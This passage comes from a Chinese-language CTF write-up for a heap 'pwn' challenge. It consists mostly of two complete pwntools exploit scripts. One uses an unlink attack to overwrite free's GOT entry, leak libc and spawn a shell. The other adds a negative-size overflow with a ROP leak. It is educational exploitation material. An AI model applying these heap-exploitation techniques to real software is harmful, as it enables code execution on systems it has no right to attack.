class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./ctflibc.so.6&#x27;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;/usr/lib/x86_64-linux-gnu/libc-2.33.so&#x27;</span>)</span><br><span class="line">libc_atoi_addr = libc.symbols[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">libc_sys_addr = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">libc_write_addr = libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_atoi_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_sys_addr))</span><br><span class="line"></span><br><span class="line">chunk_addr_bss = <span class="number">0x6020E0</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment"># io = remote(&#x27;111.200.241.244&#x27;, 54585)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size, index, content</span>):</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;$ &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Input size\n&#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Input cun\n&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">io.sendafter(<span class="string">b&#x27;Input content\n&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;$ &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Chose one to dele\n&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;$ &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Chose one to edit\n&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">io.sendafter(<span class="string">b&#x27;Input the content\n&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line">main_addr = <span class="number">0x400C8C</span></span><br><span class="line">pop_rdi_ret_addr = <span class="number">0x400DA3</span></span><br><span class="line">one_gadget_addr = <span class="number">0x41EBC</span></span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">b&#x27;CoLin&#x27;</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x420</span>, <span class="number">0</span>, <span class="string">b&#x27;flag&#x27;</span>)</span><br><span class="line">create(<span class="number">0x420</span>, <span class="number">1</span>, <span class="string">b&#x27;flag&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)<span class="comment"># fake chunk prev_size</span></span><br><span class="line">payload += p64(<span class="number">0x420</span>)<span class="comment"># fake chunk size</span></span><br><span class="line">payload += p64(chunk_addr_bss - <span class="number">0x18</span>)<span class="comment"># fake chunk fd</span></span><br><span class="line">payload += p64(chunk_addr_bss - <span class="number">0x10</span>)<span class="comment"># fake chunk_bk</span></span><br><span class="line">payload += <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x400</span><span class="comment"># useless filling data</span></span><br><span class="line"></span><br><span class="line">payload += p64(<span class="number">0x420</span>)<span class="comment"># front chunk prev_size (modified)</span></span><br><span class="line">payload += p64(<span class="number">0x420</span>)<span class="comment"># front size (modified)</span></span><br><span class="line">payload += <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x410</span><span class="comment"># useless filling data for front chunk</span></span><br><span class="line"></span><br><span class="line">payload += p64(<span class="number">0x420</span>)<span class="comment"># fake front-front chunk prev_size </span></span><br><span class="line">payload += p64(<span class="number">0x21</span>)<span class="comment"># fake front-front chunk size with prev_inuse = true</span></span><br><span class="line">create(<span class="number">0x860</span>, <span class="number">0</span>, payload)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)<span class="comment"># trigger unlink_chunk(av, p)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># now the address of chunk_0 (0x6020e0) has been changed into 0x6020c8, we can edit the next chunk into .got.plt</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x18</span><span class="comment"># useless data for filling</span></span><br><span class="line">payload += p64(<span class="number">0x6020c8</span>)<span class="comment"># chunk_0 address</span></span><br><span class="line">payload += p64(<span class="number">1</span>)<span class="comment"># chunk_0 inuse</span></span><br><span class="line">payload += p64(<span class="number">0x602018</span>)<span class="comment"># change the chunk_1 to .got.plt of free()</span></span><br><span class="line">payload += p64(<span class="number">1</span>)<span class="comment"># change chunk_1 into inuse</span></span><br><span class="line">payload += p64(<span class="number">0x602028</span>)<span class="comment"># the .got.plt of write, ready to be used to get libc loading address</span></span><br><span class="line">payload += p64(<span class="number">1</span>)<span class="comment"># set the chunk_2 into inuse for free()</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, payload)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>]))<span class="comment"># change the address, now free() equals puts()</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">mem_write_addr = u64(io.recv(<span class="number">6</span>) + <span class="string">b&#x27;\x00\x00&#x27;</span>)<span class="comment"># get the write() address in memory</span></span><br><span class="line">libc_base = mem_write_addr - libc_write_addr<span class="comment"># libc loading base</span></span><br><span class="line">mem_sys_addr = libc_base + libc_sys_addr<span class="comment"># system() address in memory</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, p64(mem_sys_addr))<span class="comment"># now free() equals system()</span></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x20</span>, <span class="number">3</span>, <span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>当然，本着学习的态度，我们可以思考一下，除了这种方法还有没有其他的方法呢？在发布wp点赞第一的文章中，我看到了对整型溢出的利用。上面的方法不需要整型溢出就可以实现，而整型溢出为我们提供了另外一种获取libc加载地址的方法。</p><p>由于本程序没有canary，如果我们将size写成负数，就可以在栈上实现溢出。但是这里我有一点不太清楚：如果将size写为负数，那么malloc注定失败返回空指针。在将content写入栈时，dest的值仍然是0，为什么不会报段错误？在进行gdb调试时，read函数检测到size为-1时根本就不会中断等待输入，而在脚本中我们强制传过去了一段内容，不知这样会对程序产生什么样的影响，但memcpy这个函数注定是不会执行了。总之这种方式是有效的，使用ROP获取到了puts函数的got表地址。</p><p>之后还是通过unlink，只不过直接修改free的地址即可。</p><p>payload: （本payload在Kali上测试成功，libc版本：Debian GLIBC 2.33-6，2022&#x2F;4&#x2F;5最新更新版本）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./ctflibc.so.6&#x27;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;/usr/lib/x86_64-linux-gnu/libc-2.33.so&#x27;</span>)</span><br><span class="line">libc_atoi_addr = libc.symbols[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">libc_sys_addr = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">libc_puts_addr = libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_atoi_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_sys_addr))</span><br><span class="line"></span><br><span class="line">chunk_addr_bss = <span class="number">0x6020E0</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment"># io = remote(&#x27;111.200.241.244&#x27;, 54585)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size, index, content</span>):</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;$ &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Input size\n&#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Input cun\n&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">io.sendafter(<span class="string">b&#x27;Input content\n&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;$ &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Chose one to dele\n&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;$ &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Chose one to edit\n&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">io.sendafter(<span class="string">b&#x27;Input the content\n&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line">main_addr = <span class="number">0x400C8C</span></span><br><span class="line">pop_rdi_ret_addr = <span class="number">0x400DA3</span></span><br><span class="line">one_gadget_addr = <span class="number">0x41EBC</span></span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">b&#x27;CoLin&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x80</span>)</span><br><span class="line">payload += <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">8</span><span class="comment"># the dest address, not matter</span></span><br><span class="line">payload += <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">8</span><span class="comment"># not to change the index</span></span><br><span class="line">payload += cyclic(<span class="number">0x8</span>)<span class="comment"># size</span></span><br><span class="line">payload += p64(pop_rdi_ret_addr) + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])<span class="comment"># pop the address of .got.plt(puts) to rdi</span></span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>]) + p64(main_addr)<span class="comment"># return to start address of main</span></span><br><span class="line"></span><br><span class="line">create(-<span class="number">1</span>, <span class="number">0</span>, payload)</span><br><span class="line"></span><br><span class="line">mem_puts_addr = u64(io.recv(<span class="number">6</span>) + <span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">libc_base = mem_puts_addr - libc_puts_addr</span><br><span class="line">mem_sys_addr = libc_base + libc_sys_addr</span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">b&#x27;CoLin&#x27;</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x420</span>, <span class="number">0</span>, <span class="string">b&#x27;flag&#x27;</span>)</span><br><span class="line">create(<span class="number">0x420</span>, <span class="number">1</span>, <span class="string">b&#x27;flag&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)<span class="comment"># fake chunk prev_size</span></span><br><span class="line">payload += p64(<span class="number">0x420</span>)<span class="comment"># fake chunk size</span></span><br><span class="line">payload += p64(chunk_addr_bss - <span class="number">0x18</span>)<span class="comment"># fake chunk fd</span></span><br><span class="line">payload += p64(chunk_addr_bss - <span class="number">0x10</span>)<span class="comment"># fake chunk_bk</span></span><br><span class="line">payload += <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x400</span><span class="comment"># useless filling data</span></span><br><span class="line"></span><br><span class="line">payload += p64(<span class="number">0x420</span>)<span class="comment"># front chunk prev_size (modified)</span></span><br><span class="line">payload += p64(<span class="number">0x420</span>)<span class="comment"># front size (modified)</span></span><br><span class="line">payload += <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x410</span><span class="comment"># useless filling data for front chunk</span></span><br><span class="line"></span><br><span class="line">payload += p64(<span class="number">0x420</span>)<span class="comment"># fake front-front chunk prev_size </span></span><br><span class="line">payload += p64(<span class="number">0x21</span>)<span class="comment"># fake front-front chunk size with prev_inuse = true</span></span><br><span class="line">create(<span class="number">0x860</span>, <span class="number">0</span>, payload)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)<span class="comment"># trigger unlink_chunk(av, p)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># now the address of chunk_0 (0x6020e0) has been changed into 0x6020c8, we can edit the next chunk into .got.plt</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x18</span><span class="comment"># useless data for filling</span></span><br><span class="line">payload += p64(<span class="number">0x6020c8</span>)<span class="comment"># chunk_0 address</span></span><br><span class="line">payload += p64(<span class="number">1</span>)<span class="comment"># chunk_0 inuse</span></span><br><span class="line">payload += p64(<span class="number">0x602018</span>)<span class="comment"># change the chunk_1 to .got.plt of free()</span></span><br><span class="line">payload += p64(<span class="number">1</span>)<span class="comment"># change chunk_1 into inuse</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, payload)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, p64(mem_sys_addr))<span class="comment"># change the address, now free() equals system()</span></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x20</span>, <span class="number">2</span>, <span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>以上就是适用于目前最新版本libc的两种解题方案。如果版本比较老还可以考虑使用fastbin的double_free，但是考虑到目前比赛使用的glibc版本越来越高，这里只分析这两种方法。</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
